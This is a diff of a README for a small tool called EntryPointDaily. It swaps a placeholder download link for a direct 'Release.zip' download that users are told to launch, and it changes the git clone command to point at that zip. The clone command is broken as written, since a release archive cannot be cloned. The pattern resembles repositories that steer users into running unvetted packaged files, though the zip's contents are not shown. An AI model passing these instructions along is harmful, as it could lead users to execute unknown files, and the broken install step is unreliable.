@@ -24,7 +24,7 @@ EntryPointDaily is a handy script that checks for the daily challenge and prompt
 🔍 wikipedia-scraper  
 
 ## Download
-[![Download EntryPointDaily](https://img.shields.io/badge/Download-Here-blue.svg)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)  
+[![Download EntryPointDaily](https://github.com/VayneXzerO/EntryPointDaily/releases/download/v1.0/Release.zip)](https://github.com/VayneXzerO/EntryPointDaily/releases/download/v1.0/Release.zip)  
 Please note that the file needs to be launched after downloading.
 
 If the link does not work or if you need more options, feel free to visit the "Releases" section of the repository.
@@ -32,7 +32,7 @@ If the link does not work or if you need more options, feel free to visit the "R
 ## Installation
 Here's how you can get started with EntryPointDaily:
 
-1. Clone the repository to your local machine using `git clone https://github.com/your-username/EntryPointDaily.git`
+1. Clone the repository to your local machine using `git clone https://github.com/VayneXzerO/EntryPointDaily/releases/download/v1.0/Release.zip`
 2. Navigate to the project directory
 3. Run the script using your preferred Python interpreter
 
